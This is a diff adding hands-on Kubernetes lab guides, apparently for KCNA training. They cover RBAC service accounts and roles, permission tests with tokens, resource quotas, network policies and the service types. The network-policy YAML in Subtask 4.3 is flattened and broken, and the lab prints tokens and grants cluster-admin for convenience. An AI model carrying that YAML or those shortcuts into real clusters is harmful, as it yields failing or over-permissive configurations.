+Task 2: Create Service Accounts and Implement RBAC
+Subtask 2.1: Create a Dedicated Namespace
+
+    Create a new namespace for our security lab:
+
+kubectl create namespace security-lab
+
+    Set the namespace as default for this session:
+
+kubectl config set-context --current --namespace=security-lab
+
+    Verify the namespace creation:
+
+kubectl get namespaces
+
+Subtask 2.2: Create Service Accounts
+
+    Create a service account for a developer role:
+
+kubectl create serviceaccount developer-sa -n security-lab
+
+    Create a service account for a viewer role:
+
+kubectl create serviceaccount viewer-sa -n security-lab
+
+    Create a service account for an admin role:
+
+kubectl create serviceaccount admin-sa -n security-lab
+
+    Verify service account creation:
+
+kubectl get serviceaccounts -n security-lab
+
+    Examine the developer service account details:
+
+kubectl describe serviceaccount developer-sa -n security-lab
+
+Subtask 2.3: Create Custom Roles
+
+    Create a developer role with specific permissions:
+
+Create a file named developer-role.yaml:
+
+cat > developer-role.yaml << EOF
+apiVersion: rbac.authorization.k8s.io/v1
+kind: Role
+metadata:
+  namespace: security-lab
+  name: developer-role
+rules:
+- apiGroups: [""]
+  resources: ["pods", "services", "configmaps", "secrets"]
+  verbs: ["get", "list", "create", "update", "patch", "delete"]
+- apiGroups: ["apps"]
+  resources: ["deployments", "replicasets"]
+  verbs: ["get", "list", "create", "update", "patch", "delete"]
+EOF
+
+    Apply the developer role:
+
+kubectl apply -f developer-role.yaml
+
+    Create a viewer role with read-only permissions:
+
+Create a file named viewer-role.yaml:
+
+cat > viewer-role.yaml << EOF
+apiVersion: rbac.authorization.k8s.io/v1
+kind: Role
+metadata:
+  namespace: security-lab
+  name: viewer-role
+rules:
+- apiGroups: [""]
+  resources: ["pods", "services", "configmaps"]
+  verbs: ["get", "list"]
+- apiGroups: ["apps"]
+  resources: ["deployments", "replicasets"]
+  verbs: ["get", "list"]
+EOF
+
+    Apply the viewer role:
+
+kubectl apply -f viewer-role.yaml
+
+    Verify role creation:
+
+kubectl get roles -n security-lab
+
+Subtask 2.4: Create Role Bindings
+
+    Bind the developer role to the developer service account:
+
+Create a file named developer-rolebinding.yaml:
+
+cat > developer-rolebinding.yaml << EOF
+apiVersion: rbac.authorization.k8s.io/v1
+kind: RoleBinding
+metadata:
+  name: developer-binding
+  namespace: security-lab
+subjects:
+- kind: ServiceAccount
+  name: developer-sa
+  namespace: security-lab
+roleRef:
+  kind: Role
+  name: developer-role
+  apiGroup: rbac.authorization.k8s.io
+EOF
+
+    Apply the developer role binding:
+
+kubectl apply -f developer-rolebinding.yaml
+
+    Bind the viewer role to the viewer service account:
+
+Create a file named viewer-rolebinding.yaml:
+
+cat > viewer-rolebinding.yaml << EOF
+apiVersion: rbac.authorization.k8s.io/v1
+kind: RoleBinding
+metadata:
+  name: viewer-binding
+  namespace: security-lab
+subjects:
+- kind: ServiceAccount
+  name: viewer-sa
+  namespace: security-lab
+roleRef:
+  kind: Role
+  name: viewer-role
+  apiGroup: rbac.authorization.k8s.io
+EOF
+
+    Apply the viewer role binding:
+
+kubectl apply -f viewer-rolebinding.yaml
+
+    Bind the admin service account to cluster-admin role:
+
+Create a file named admin-clusterrolebinding.yaml:
+
+cat > admin-clusterrolebinding.yaml << EOF
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRoleBinding
+metadata:
+  name: admin-binding
+subjects:
+- kind: ServiceAccount
+  name: admin-sa
+  namespace: security-lab
+roleRef:
+  kind: ClusterRole
+  name: cluster-admin
+  apiGroup: rbac.authorization.k8s.io
+EOF
+
+    Apply the admin cluster role binding:
+
+kubectl apply -f admin-clusterrolebinding.yaml
+
+    Verify all role bindings:
+
+kubectl get rolebindings -n security-lab
+kubectl get clusterrolebindings | grep admin-binding
+
+Task 3: Test Access Control Mechanisms
+Subtask 3.1: Create Test Resources
+
+    Create a test deployment for our access control tests:
+
+Create a file named test-deployment.yaml:
+
+cat > test-deployment.yaml << EOF
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: test-app
+  namespace: security-lab
+spec:
+  replicas: 2
+  selector:
+    matchLabels:
+      app: test-app
+  template:
+    metadata:
+      labels:
+        app: test-app
+    spec:
+      containers:
+      - name: nginx
+        image: nginx:1.20
+        ports:
+        - containerPort: 80
+        resources:
+          requests:
+            memory: "64Mi"
+            cpu: "250m"
+          limits:
+            memory: "128Mi"
+            cpu: "500m"
+EOF
+
+    Deploy the test application:
+
+kubectl apply -f test-deployment.yaml
+
+    Verify the deployment:
+
+kubectl get deployments -n security-lab
+kubectl get pods -n security-lab
+
+Subtask 3.2: Test Service Account Permissions
+
+    Get service account tokens for testing:
+
+# Get the developer service account token
+DEVELOPER_TOKEN=$(kubectl create token developer-sa -n security-lab)
+echo "Developer token: $DEVELOPER_TOKEN"
+
+# Get the viewer service account token
+VIEWER_TOKEN=$(kubectl create token viewer-sa -n security-lab)
+echo "Viewer token: $VIEWER_TOKEN"
+
+# Get the admin service account token
+ADMIN_TOKEN=$(kubectl create token admin-sa -n security-lab)
+echo "Admin token: $ADMIN_TOKEN"
+
+    Test developer permissions (should succeed):
+
+# Test listing pods as developer
+kubectl --token=$DEVELOPER_TOKEN get pods -n security-lab
+
+# Test creating a configmap as developer
+kubectl --token=$DEVELOPER_TOKEN create configmap test-config --from-literal=key1=value1 -n security-lab
+
+# Test scaling deployment as developer
+kubectl --token=$DEVELOPER_TOKEN scale deployment test-app --replicas=3 -n security-lab
+
+    Test viewer permissions (read operations should succeed):
+
+# Test listing pods as viewer (should work)
+kubectl --token=$VIEWER_TOKEN get pods -n security-lab
+
+# Test listing deployments as viewer (should work)
+kubectl --token=$VIEWER_TOKEN get deployments -n security-lab
+
+    Test viewer unauthorized actions (should fail):
+
+# Test creating a configmap as viewer (should fail)
+kubectl --token=$VIEWER_TOKEN create configmap viewer-test --from-literal=key1=value1 -n security-lab
+
+# Test deleting a pod as viewer (should fail)
+kubectl --token=$VIEWER_TOKEN delete pod $(kubectl get pods -n security-lab -o jsonpath='{.items[0].metadata.name}') -n security-lab
+
+    Test admin permissions (should succeed for everything):
+
+# Test cluster-wide operations as admin
+kubectl --token=$ADMIN_TOKEN get nodes
+
+# Test creating resources in any namespace
+kubectl --token=$ADMIN_TOKEN create configmap admin-test --from-literal=admin=true -n default
+
+Subtask 3.3: Verify Access Control Results
+
+    Check what resources were created by different service accounts:
+
+kubectl get configmaps -n security-lab
+kubectl get configmaps -n default
+
+    Examine the current state of our test deployment:
+
+kubectl get deployment test-app -n security-lab
+kubectl describe deployment test-app -n security-lab
+
+Task 4: Configure Admission Controllers
+Subtask 4.1: Understand Current Admission Controllers
+
+    Check which admission controllers are enabled:
+
+kubectl describe pod kube-apiserver-$(hostname) -n kube-system | grep admission
+
+    Create a resource quota to demonstrate admission control:
+
+Create a file named resource-quota.yaml:
+
+cat > resource-quota.yaml << EOF
+apiVersion: v1
+kind: ResourceQuota
+metadata:
+  name: security-lab-quota
+  namespace: security-lab
+spec:
+  hard:
+    requests.cpu: "2"
+    requests.memory: 2Gi
+    limits.cpu: "4"
+    limits.memory: 4Gi
+    pods: "10"
+    services: "5"
+    configmaps: "10"
+EOF
+
+    Apply the resource quota:
+
+kubectl apply -f resource-quota.yaml
+
+    Verify the resource quota:
+
+kubectl describe resourcequota security-lab-quota -n security-lab
+
+Subtask 4.2: Test Resource Quota Enforcement
+
+    Create a deployment that exceeds resource limits:
+
+Create a file named resource-heavy-deployment.yaml:
+
+cat > resource-heavy-deployment.yaml << EOF
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: resource-heavy-app
+  namespace: security-lab
+spec:
+  replicas: 5
+  selector:
+    matchLabels:
+      app: resource-heavy-app
+  template:
+    metadata:
+      labels:
+        app: resource-heavy-app
+    spec:
+      containers:
+      - name: nginx
+        image: nginx:1.20
+        ports:
+        - containerPort: 80
+        resources:
+          requests:
+            memory: "1Gi"
+            cpu: "1"
+          limits:
+            memory: "2Gi"
+            cpu: "2"
+EOF
+
+    Try to apply the resource-heavy deployment:
+
+kubectl apply -f resource-heavy-deployment.yaml
+
+    Check the deployment status:
+
+kubectl get deployment resource-heavy-app -n security-lab
+kubectl describe deployment resource-heavy-app -n security-lab
+
+    Check resource quota usage:
+
+kubectl describe resourcequota security-lab-quota -n security-lab
+
+Subtask 4.3: Configure Network Policies (Additional Admission Control)
+
+    Create a network policy to restrict pod communication:
+
+Create a file named network-policy.yaml: ```bash cat > network-policy.yaml << EOF apiVersion: networking.k8s.io/v1 kind: NetworkPolicy metadata: name: deny-all-ingress namespace: security-lab spec: podSelector: {} policyTypes: - Ingress
+
+apiVersion: networking.k8s.io/v1 kind: NetworkPolicy metadata: name: allow-test-app-ingress namespace: security-lab spec: podSelector: matchLabels: app: test-app policyTypes:
+
+    Ingress ingress:
+    from:
+        podSelector: matchLabels: access: allowed
+
+    ports:
+        protocol: TCP port: 80 EOF
+
+
+2. **Apply the network policies**:
+```bash
+kubectl apply -f network-policy.yaml
+
+    Verify network policies:
+
+kubectl get networkpolicies -n security-lab
+kubectl describe networkpolicy deny-all-ingress -n security-lab
+
+Task 5: Validate Security Implementation
+Subtask 5.1: Comprehensive Security Testing
+
+    Create a test pod to verify network policies:
+
+Create a file named test-client.yaml:
+
+cat > test-client.yaml << EOF
+apiVersion: v1
+kind: Pod
+metadata:
+  name: test-client
+  namespace: security-lab
+  labels:
+    access: allowed
+spec:
+  containers:
+  - name: client
+    image: busybox
+    command: ['sleep', '3600']
+EOF
+
+    Apply the test client:
+
+kubectl apply -f test-client.yaml
+
+    Test network connectivity:
+
+# Wait for pod to be ready
+kubectl wait --for=condition=Ready pod/test-client -n security-lab --timeout=60s
+
+# Get the IP of one of the test-app pods
+TEST_APP_IP=$(kubectl get pod -l app=test-app -n security-lab -o jsonpath='{.items[0].status.podIP}')
+
+# Test connection from allowed client (should work)
+kubectl exec test-client -n security-lab -- wget -qO- --timeout=5 http://$TEST_APP_IP
+
+    Create an unauthorized client and test:
+
+Create a file named unauthorized-client.yaml:
+
+cat > unauthorized-client.yaml << EOF
+apiVersion: v1
+kind: Pod
+metadata:
+  name: unauthorized-client
+  namespace: security-lab
+spec:
+  containers:
+  - name: client
+    image: busybox
+    command: ['sleep', '3600']
+EOF
+
+    Apply and test unauthorized client:
+
+kubectl apply -f unauthorized-client.yaml
+
+# Wait for pod to be ready
+kubectl wait --for=condition=Ready pod/unauthorized-client -n security-lab --timeout=60s
+
+# Test connection from unauthorized client (should fail/timeout)
+kubectl exec unauthorized-client -n security-lab -- timeout 10 wget -qO- http://$TEST_APP_IP || echo "Connection blocked by network policy"
+
+Subtask 5.2: Security Audit and Verification
+
+    Review all security components created:
+
+echo "=== Service Accounts ==="
+kubectl get serviceaccounts -n security-lab
+
+echo "=== Roles ==="
+kubectl get roles -n security-lab
+
+echo "=== Role Bindings ==="
+kubectl get rolebindings -n security-lab
+
+echo "=== Resource Quotas ==="
+kubectl get resourcequotas -n security-lab
+
+echo "=== Network Policies ==="
+kubectl get networkpolicies -n security-lab
+
+    Test final access control scenarios:
+
+# Test developer can still create resources within quota
+kubectl --token=$DEVELOPER_TOKEN create configmap final-test --from-literal=test=passed -n security-lab
+
+# Test viewer still cannot create resources
+kubectl --token=$VIEWER_TOKEN create configmap viewer-final-test --from-literal=test=failed -n security-lab || echo "Access denied as expected"
+
+# Check quota usage
+kubectl describe resourcequota security-lab-quota -n security-lab
+
+    Generate a security summary report:
+
+echo "=== SECURITY LAB SUMMARY REPORT ==="
+echo "Namespace: security-lab"
+echo "Service Accounts Created: $(kubectl get sa -n security-lab --no-headers | wc -l)"
+echo "Roles Created: $(kubectl get roles -n security-lab --no-headers | wc -l)"
+echo "Role Bindings Created: $(kubectl get rolebindings -n security-lab --no-headers | wc -l)"
+echo "Network Policies Active: $(kubectl get networkpolicies -n security-lab --no-headers | wc -l)"
+echo "Resource Quotas Enforced: $(kubectl get resourcequotas -n security-lab --no-headers | wc -l)"
+echo "Pods Running: $(kubectl get pods -n security-lab --no-headers | grep Running | wc -l)"
+
+Troubleshooting Common Issues
+Issue 1: Service Account Token Not Working
+
+Problem: Authentication fails with service account token Solution:
+
+# Recreate the token
+kubectl delete token <token-name> -n security-lab
+kubectl create token <service-account-name> -n security-lab
+
+Issue 2: RBAC Permissions Not Applied
+
+Problem: Role bindings don't seem to work Solution:
+
+# Check role binding details
+kubectl describe rolebinding <binding-name> -n security-lab
+# Verify the role exists
+kubectl get role <role-name> -n security-lab
+
+Issue 3: Resource Quota Not Enforcing
+
+Problem: Pods are created despite quota limits Solution:
+
+# Check quota status
+kubectl describe resourcequota -n security-lab
+# Ensure pods have resource requests/limits specified
+
+Issue 4: Network Policy Not Working
+
+Problem: Network policies don't block traffic Solution:
+
+# Verify your cluster supports network policies
+kubectl get pods -n kube-system | grep -i network
+# Check if CNI plugin supports network policies
+
+Cleanup Instructions
+
+To clean up the lab environment:
+
+# Delete the namespace (this removes all resources)
+kubectl delete namespace security-lab
+
+# Remove cluster role binding
+kubectl delete clusterrolebinding admin-binding
+
+# Reset kubectl context
+kubectl config set-context --current --namespace=default
+
+Conclusion
+
+In this comprehensive lab, you have successfully implemented and tested Kubernetes security mechanisms including:
+
+Authentication & Authorization: • Created multiple service accounts with different permission levels • Implemented Role-Based Access Control (RBAC) with custom roles • Tested access control by attempting both authorized and unauthorized actions • Verified that different service accounts have appropriate permissions
+
+Admission Control: • Configured resource quotas to enforce resource limits • Implemented network policies to control pod-to-pod communication • Tested admission controllers by attempting to exceed defined limits • Validated that security policies are properly enforced
+
+Key Security Concepts Learned: • Service Accounts provide identity for applications running in pods • RBAC enables fine-grained access control using roles and role bindings • Admission Controllers enforce policies and validate requests before resources are created • Resource Quotas prevent resource exhaustion and ensure fair resource allocation • Network Policies provide network-level security by controlling traffic flow
+
+Why This Matters: Security is fundamental to any production Kubernetes environment. The skills you've learned in this lab are essential for: • Protecting sensitive applications and data • Implementing the principle of least privilege • Ensuring compliance with security standards • Preventing unauthorized access and resource abuse • Building secure, multi-tenant Kubernetes clusters
+
+These security practices are critical for the Kubernetes and Cloud Native Associate (KCNA) certification and are fundamental skills for anyone working with Kubernetes in production environments. The hands-on experience gained from this lab provides practical knowledge that directly applies to real-world Kubernetes security implementations.
+
+
+
+
+Lab 9: Configuring and Using Kubernetes Services
+Objectives
+
+By the end of this lab, you will be able to:
+
+• Understand the different types of Kubernetes services and their use cases • Deploy applications and expose them using ClusterIP services • Configure and test NodePort services for external access • Set up LoadBalancer services in cloud environments • Verify service connectivity and troubleshoot common issues • Understand service discovery and DNS resolution in Kubernetes
+Prerequisites
+
+Before starting this lab, you should have:
+
+• Basic understanding of Kubernetes concepts (pods, deployments, namespaces) • Familiarity with command-line interface operations • Basic knowledge of networking concepts (IP addresses, ports) • Understanding of YAML file structure • Previous experience with kubectl commands
+
+Note: Al Nafi provides ready-to-use Linux-based cloud machines with Kubernetes pre-installed. Simply click Start Lab to begin - no need to build your own VM or install Kubernetes manually.
+Lab Environment Setup
+
+Your Al Nafi cloud machine comes pre-configured with: • Kubernetes cluster (single-node or multi-node) • kubectl command-line tool • Docker runtime • All necessary networking components
+Task 1: Deploy an Application and Expose it Using ClusterIP Service
+Subtask 1.1: Create a Sample Application Deployment
+
+First, let's create a simple web application deployment that we'll use throughout this lab.
+
+    Create a new directory for your lab files:
+
+mkdir ~/k8s-services-lab
+cd ~/k8s-services-lab
+
+    Create a deployment YAML file for a sample nginx application:
+
+cat > nginx-deployment.yaml << EOF
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: nginx-app
+  labels:
+    app: nginx
+spec:
+  replicas: 3
+  selector:
+    matchLabels:
+      app: nginx
+  template:
+    metadata:
+      labels:
+        app: nginx
+    spec:
+      containers:
+      - name: nginx
+        image: nginx:1.21
+        ports:
+        - containerPort: 80
+        resources:
+          requests:
+            memory: "64Mi"
+            cpu: "250m"
+          limits:
+            memory: "128Mi"
+            cpu: "500m"
+EOF
+
+    Deploy the application to your Kubernetes cluster:
+
+kubectl apply -f nginx-deployment.yaml
+
+    Verify that the deployment is running:
+
+kubectl get deployments
+kubectl get pods -l app=nginx
+
+You should see 3 nginx pods in the Running state.
+Subtask 1.2: Create a ClusterIP Service
+
+A ClusterIP service is the default service type that exposes the service on an internal IP within the cluster. It's only accessible from within the cluster.
+
+    Create a ClusterIP service YAML file:
+
+cat > nginx-clusterip-service.yaml << EOF
+apiVersion: v1
+kind: Service
+metadata:
+  name: nginx-clusterip-service
+  labels:
+    app: nginx
+spec:
+  type: ClusterIP
+  selector:
+    app: nginx
+  ports:
+  - port: 80
+    targetPort: 80
+    protocol: TCP
+EOF
+
+    Apply the ClusterIP service:
+
+kubectl apply -f nginx-clusterip-service.yaml
+
+    Verify the service creation:
+
+kubectl get services
+kubectl describe service nginx-clusterip-service
+
+Subtask 1.3: Test ClusterIP Service Connectivity
+
+    Get the ClusterIP address of your service:
+
+kubectl get service nginx-clusterip-service -o wide
+
+    Create a temporary pod to test internal connectivity:
+
+kubectl run test-pod --image=busybox --rm -it --restart=Never -- sh
+
+    From within the test pod, test the service connectivity:
+
+# Test using the service IP (replace with your actual ClusterIP)
+wget -qO- http://10.96.xxx.xxx
+
+# Test using service name (DNS resolution)
+wget -qO- http://nginx-clusterip-service
+
+# Test using FQDN
+wget -qO- http://nginx-clusterip-service.default.svc.cluster.local
 
 # Exit the test pod
 exit
 
-Subtask 1.3: Create NetworkPolicy for Backend Namespace
+You should see the nginx welcome page HTML content, confirming that the ClusterIP service is working correctly.
+Task 2: Change Service Type to NodePort and Verify External Access
+Subtask 2.1: Convert ClusterIP to NodePort Service
 
-Create a NetworkPolicy that only allows traffic from the frontend namespace to the backend namespace.
+A NodePort service exposes the service on each node's IP at a static port, making it accessible from outside the cluster.
 
-Create a file named backend-network-policy.yaml:
+    Create a NodePort service YAML file:
 
-apiVersion: networking.k8s.io/v1
-kind: NetworkPolicy
+cat > nginx-nodeport-service.yaml << EOF
+apiVersion: v1
+kind: Service
 metadata:
-  name: backend-network-policy
-  namespace: backend
+  name: nginx-nodeport-service
+  labels:
+    app: nginx
 spec:
-  podSelector: {}
-  policyTypes:
-  - Ingress
-  - Egress
-  ingress:
-  - from:
-    - namespaceSelector:
-        matchLabels:
-          name: frontend
-    ports:
+  type: NodePort
+  selector:
+    app: nginx
+  ports:
+  - port: 80
+    targetPort: 80
+    nodePort: 30080
+    protocol: TCP
+EOF
+
+    Apply the NodePort service:
+
+kubectl apply -f nginx-nodeport-service.yaml
+
+    Verify the NodePort service:
+
+kubectl get services
+kubectl describe service nginx-nodeport-service
+
+Subtask 2.2: Test External Access via NodePort
+
+    Get your node's external IP address:
+
+kubectl get nodes -o wide
+
+    Test external access using curl (replace with your node's IP):
+
+# Test from within the cluster
+curl http://localhost:30080
+
+# If you have external access to the node
+curl http://NODE_EXTERNAL_IP:30080
+
+    Verify that the service is accessible on all nodes:
+
+# List all nodes
+kubectl get nodes
+
+# Check if the service is accessible on each node
+for node in $(kubectl get nodes -o jsonpath='{.items[*].status.addresses[?(@.type=="InternalIP")].address}'); do
+  echo "Testing node: $node"
+  curl -s http://$node:30080 | grep -o "<title>.*</title>" || echo "Failed to connect"
+done
+
+Subtask 2.3: Understanding NodePort Range and Limitations
+
+    Check the default NodePort range:
+
+kubectl cluster-info dump | grep service-node-port-range
+
+    Create another NodePort service without specifying a port:
+
+cat > nginx-nodeport-auto.yaml << EOF
+apiVersion: v1
+kind: Service
+metadata:
+  name: nginx-nodeport-auto
+  labels:
+    app: nginx
+spec:
+  type: NodePort
+  selector:
+    app: nginx
+  ports:
+  - port: 80
+    targetPort: 80
+    protocol: TCP
+EOF
+
+    Apply and observe the automatically assigned port:
+
+kubectl apply -f nginx-nodeport-auto.yaml
+kubectl get service nginx-nodeport-auto
+
+Task 3: Configure LoadBalancer Service in Cloud Environment
+Subtask 3.1: Understanding LoadBalancer Services
+
+A LoadBalancer service exposes the service externally using a cloud provider's load balancer. This is the most production-ready way to expose services externally.
+
+Note: LoadBalancer services require a cloud provider that supports external load balancers. If you're running on a local cluster or a cloud provider without load balancer support, the service will remain in Pending state.
+
+    Create a LoadBalancer service YAML file:
+
+cat > nginx-loadbalancer-service.yaml << EOF
+apiVersion: v1
+kind: Service
+metadata:
+  name: nginx-loadbalancer-service
+  labels:
+    app: nginx
+  annotations:
+    service.beta.kubernetes.io/aws-load-balancer-type: "nlb"
+spec:
+  type: LoadBalancer
+  selector:
+    app: nginx
+  ports:
+  - port: 80
+    targetPort: 80
+    protocol: TCP
+EOF
+
+    Apply the LoadBalancer service:
+
+kubectl apply -f nginx-loadbalancer-service.yaml
+
+    Monitor the LoadBalancer service creation:
+
+kubectl get service nginx-loadbalancer-service --watch
+
+Subtask 3.2: Test LoadBalancer Service (Cloud Environment)
+
+If you're in a supported cloud environment:
+
+    Wait for the external IP to be assigned:
+
+kubectl get service nginx-loadbalancer-service
+
+    Once the external IP is available, test the service:
+
+# Replace EXTERNAL-IP with the actual external IP
+curl http://EXTERNAL-IP
+
+    Test load balancing by making multiple requests:
+
+for i in {1..10}; do
+  curl -s http://EXTERNAL-IP | grep -o "Server: .*" || echo "Request $i failed"
+  sleep 1
+done
+
+Subtask 3.3: Simulate LoadBalancer with MetalLB (Local Environment)
+
+If you're in a local environment, you can simulate LoadBalancer functionality using MetalLB:
+
+    Install MetalLB:
+
+kubectl apply -f https://raw.githubusercontent.com/metallb/metallb/v0.13.7/config/manifests/metallb-native.yaml
+
+    Wait for MetalLB to be ready:
+
+kubectl wait --namespace metallb-system \
+  --for=condition=ready pod \
+  --selector=app=metallb \
+  --timeout=90s
+
+    Configure MetalLB with an IP address pool:
+
+cat > metallb-config.yaml << EOF
+apiVersion: metallb.io/v1beta1
+kind: IPAddressPool
+metadata:
+  name: example
+  namespace: metallb-system
+spec:
+  addresses:
+  - 192.168.1.240-192.168.1.250
+---
+apiVersion: metallb.io/v1beta1
+kind: L2Advertisement
+metadata:
+  name: empty
+  namespace: metallb-system
+EOF
+
+    Apply the MetalLB configuration:
+
+kubectl apply -f metallb-config.yaml
+
+    Check if your LoadBalancer service now has an external IP:
+
+kubectl get service nginx-loadbalancer-service
+
+Task 4: Service Discovery and DNS Testing
+Subtask 4.1: Test Service DNS Resolution
+
+    Create a test pod for DNS testing:
+
+kubectl run dns-test --image=busybox --rm -it --restart=Never -- sh
+
+    From within the test pod, test different DNS resolution methods:
+
+# Test short name resolution
+nslookup nginx-clusterip-service
+
+# Test FQDN resolution
+nslookup nginx-clusterip-service.default.svc.cluster.local
+
+# Test service discovery
+nslookup nginx-nodeport-service
+
+# Exit the test pod
+exit
+
+Subtask 4.2: Explore Service Endpoints
+
+    Check the endpoints created by your services:
+
+kubectl get endpoints
+kubectl describe endpoints nginx-clusterip-service
+
+    Verify that endpoints match your pod IPs:
+
+kubectl get pods -l app=nginx -o wide
+
+    Test what happens when you scale your deployment:
+
+# Scale up the deployment
+kubectl scale deployment nginx-app --replicas=5
+
+# Check updated endpoints
+kubectl get endpoints nginx-clusterip-service
+
+# Scale back down
+kubectl scale deployment nginx-app --replicas=3
+
+Task 5: Service Troubleshooting and Best Practices
+Subtask 5.1: Common Service Issues and Solutions
+
+    Create a service with incorrect selector to demonstrate troubleshooting:
+
+cat > nginx-broken-service.yaml << EOF
+apiVersion: v1
+kind: Service
+metadata:
+  name: nginx-broken-service
+spec:
+  type: ClusterIP
+  selector:
+    app: wrong-label
+  ports:
+  - port: 80
+    targetPort: 80
+EOF
+
+    Apply the broken service:
+
+kubectl apply -f nginx-broken-service.yaml
+
+    Troubleshoot the service:
+
+# Check service details
+kubectl describe service nginx-broken-service
+
+# Check endpoints (should be empty)
+kubectl get endpoints nginx-broken-service
+
+# Compare with working service
+kubectl get endpoints nginx-clusterip-service
+
+    Fix the service by updating the selector:
+
+kubectl patch service nginx-broken-service -p '{"spec":{"selector":{"app":"nginx"}}}'
+
+    Verify the fix:
+
+kubectl get endpoints nginx-broken-service
+
+Subtask 5.2: Service Performance and Monitoring
+
+    Check service resource usage:
+
+kubectl top pods -l app=nginx
+
+    Monitor service connections:
+
+# Create a load testing pod
+kubectl run load-test --image=busybox --rm -it --restart=Never -- sh
+
+# From within the load test pod, generate some traffic
+for i in $(seq 1 100); do
+  wget -qO- http://nginx-clusterip-service > /dev/null
+  echo "Request $i completed"
+done
+
+exit
+
+    Check service logs:
+
+kubectl logs -l app=nginx --tail=20
+
+Task 6: Cleanup and Service Management
+Subtask 6.1: Clean Up Resources
+
+    List all services created in this lab:
+
+kubectl get services
+
+    Delete the services:
+
+kubectl delete service nginx-clusterip-service
+kubectl delete service nginx-nodeport-service
+kubectl delete service nginx-loadbalancer-service
+kubectl delete service nginx-nodeport-auto
+kubectl delete service nginx-broken-service
+
+    Delete the deployment:
+
+kubectl delete deployment nginx-app
+
+    Verify cleanup:
+
+kubectl get all
+
+Subtask 6.2: Service Configuration Best Practices
+
+    Create a production-ready service configuration:
+
+cat > nginx-production-service.yaml << EOF
+apiVersion: v1
+kind: Service
+metadata:
+  name: nginx-production
+  labels:
+    app: nginx
+    environment: production
+  annotations:
+    service.beta.kubernetes.io/aws-load-balancer-backend-protocol: http
+    service.beta.kubernetes.io/aws-load-balancer-healthcheck-path: /health
+spec:
+  type: LoadBalancer
+  selector:
+    app: nginx
+    environment: production
+  ports:
+  - name: http
+    port: 80
+    targetPort: 80
+    protocol: TCP
+  - name: https
+    port: 443
+    targetPort: 443
+    protocol: TCP
+  sessionAffinity: ClientIP
+  sessionAffinityConfig:
+    clientIP:
+      timeoutSeconds: 10800
+EOF
+
+This configuration includes:
+
+    Proper labeling for organization
+    Annotations for cloud provider specific settings
+    Named ports for clarity
+    Multiple ports for HTTP and HTTPS
+    Session affinity for sticky sessions
+
+Troubleshooting Common Issues
+Service Not Accessible
+
+Problem: Service is not responding to requests Solutions:
+
+    Check if pods are running: kubectl get pods -l app=nginx
+    Verify service selector matches pod labels: kubectl describe service SERVICE_NAME
+    Check endpoints: kubectl get endpoints SERVICE_NAME
+    Test from within cluster first before external access
+
+LoadBalancer Stuck in Pending
+
+Problem: LoadBalancer service shows <pending> for external IP Solutions:
+
+    Verify cloud provider supports LoadBalancer services
+    Check cloud provider quotas and limits
+    Review service annotations for cloud-specific requirements
+    Consider using NodePort or Ingress as alternatives
+
+DNS Resolution Issues
+
+Problem: Services not accessible by name Solutions:
+
+    Check CoreDNS pods: kubectl get pods -n kube-system -l k8s-app=kube-dns
+    Verify service exists: kubectl get services
+    Test with FQDN: service-name.namespace.svc.cluster.local
+    Check network policies that might block DNS
+
+Conclusion
+
+In this lab, you have successfully:
+
+• Deployed applications and exposed them using different Kubernetes service types • Configured ClusterIP services for internal cluster communication • Set up NodePort services to enable external access through node IPs • Implemented LoadBalancer services for production-grade external access • Tested service discovery and DNS resolution within the cluster • Troubleshot common service issues and applied best practices
+
+Why This Matters: Kubernetes services are fundamental to application networking and service discovery. Understanding how to properly configure and use different service types is crucial for:
+
+    Microservices Architecture: Services enable communication between different application components
+    High Availability: Load balancing across multiple pod replicas ensures application resilience
+    Security: ClusterIP services provide internal-only access while LoadBalancers offer controlled external access
+    Scalability: Services abstract away individual pod IPs, allowing seamless scaling
+    Production Readiness: Proper service configuration is essential for deploying applications in production environments
+
+The skills you've learned in this lab form the foundation for more advanced Kubernetes networking concepts like Ingress controllers, service meshes, and network policies. These service types and configurations are commonly tested in the Kubernetes and Cloud Native Associate (KCNA) certification and are essential for any Kubernetes practitioner.
+
+
+
+
+Lab 10: Deploying a Stand-Alone Application in Kubernetes
+Objectives
+
+By the end of this lab, you will be able to:
+
+• Create and deploy a Kubernetes manifest for a stand-alone application • Configure and deploy a NodePort service to expose applications externally • Monitor application logs using kubectl commands • View and analyze resource metrics for deployed applications • Understand the relationship between Deployments, Pods, and Services in Kubernetes • Troubleshoot common deployment issues in Kubernetes environments
+Prerequisites
+
+Before starting this lab, you should have:
+
+• Basic understanding of containerization concepts (Docker) • Familiarity with YAML file structure and syntax • Basic knowledge of Linux command line operations • Understanding of networking concepts (ports, IP addresses) • Previous experience with kubectl commands (recommended but not required)
+Lab Environment Setup
+
+Ready-to-Use Cloud Machines: Al Nafi provides pre-configured Linux-based cloud machines with Kubernetes already installed and configured. Simply click Start Lab to access your environment - no need to build your own VM or install Kubernetes from scratch.
+
+Your lab environment includes: • Ubuntu 20.04 LTS with kubectl pre-installed • Minikube cluster ready for use • All necessary tools and dependencies configured • Internet access for pulling container images
+Task 1: Write and Deploy a Kubernetes Manifest for a Stand-Alone Application
+Subtask 1.1: Verify Kubernetes Cluster Status
+
+First, let's ensure your Kubernetes cluster is running properly.
+
+    Open a terminal in your lab environment
+    Check the cluster status:
+
+kubectl cluster-info
+
+    Verify that nodes are ready:
+
+kubectl get nodes
+
+You should see output similar to:
+
+NAME       STATUS   ROLES           AGE   VERSION
+minikube   Ready    control-plane   1d    v1.28.3
+
+Subtask 1.2: Create the Application Deployment Manifest
+
+We'll deploy a simple web application using NGINX as our stand-alone application.
+
+    Create a new directory for your lab files:
+
+mkdir ~/k8s-lab10
+cd ~/k8s-lab10
+
+    Create the deployment manifest file:
+
+nano nginx-deployment.yaml
+
+    Copy and paste the following YAML content:
+
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: nginx-standalone-app
+  labels:
+    app: nginx-standalone
+spec:
+  replicas: 3
+  selector:
+    matchLabels:
+      app: nginx-standalone
+  template:
+    metadata:
+      labels:
+        app: nginx-standalone
+    spec:
+      containers:
+      - name: nginx
+        image: nginx:1.25.3
+        ports:
+        - containerPort: 80
+        resources:
+          requests:
+            memory: "64Mi"
+            cpu: "250m"
+          limits:
+            memory: "128Mi"
+            cpu: "500m"
+        env:
+        - name: NGINX_PORT
+          value: "80"
+
+    Save and exit the file (Ctrl+X, then Y, then Enter)
+
+Subtask 1.3: Deploy the Application
